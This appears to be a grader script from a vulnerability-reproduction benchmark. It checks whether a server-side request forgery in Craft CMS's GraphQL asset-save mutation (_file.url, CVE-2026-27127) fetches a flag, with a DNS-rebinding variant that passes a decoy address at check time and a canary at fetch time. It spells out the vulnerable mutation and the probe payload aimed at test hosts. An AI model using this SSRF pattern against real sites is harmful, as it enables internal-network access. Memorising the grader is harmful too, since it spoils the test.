#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = asset body contains RUN_FLAG (Craft GraphQL _file.url SSRF)
# 10 = blocked / no flag   20 = env   30 = args
#
# Seed:   http://seed.pcb.test/flag          (always 192.0.0.192)
# Residual (inline): http://rebind.pcb.test/flag  (CHECK decoy / FETCH canary)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="$RUN_FLAG"
mkdir -p "$WORK_DIR"

PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
  if [[ -n "$PORT" ]]; then
    body="$(curl -s -m 20 -X POST "http://127.0.0.1:${PORT}/index.php?p=actions/graphql/api" \
      -H 'Content-Type: application/json' \
      -H 'Authorization: Bearer pcb_gql_token_ssrf_toctou_0001' \
      -d '{"query":"{ ping }"}' 2>/dev/null || true)"
    if printf '%s' "$body" | grep -qE '"ping"[[:space:]]*:[[:space:]]*"pong"'; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $VERSION:80 / GraphQL not ready" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json"
else
  # residual CVE-2026-27127: same GraphQL save_pcbvol_Asset(_file.url) sink;
  # only the DNS answers change (CHECK 192.0.0.50, FETCH 192.0.0.192).
  printf '%s' '{"probe_id":"cve-2026-27127-dns-rebind-toctou","method":"POST","endpoint":"/index.php?p=actions/graphql/api","graphql_mutation":"save_pcbvol_Asset(_file:{url:<URL>, filename:...})","url":"http://rebind.pcb.test/flag"}' > "$WORK_DIR/cand.json"
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
if d.get('graphql_status') is None:
    sys.exit(20)
body = str(d.get('fetched_body') or d.get('body') or '')
sys.exit(0 if sys.argv[2] in body else 10)
" "$OUT" "$JUDGE"
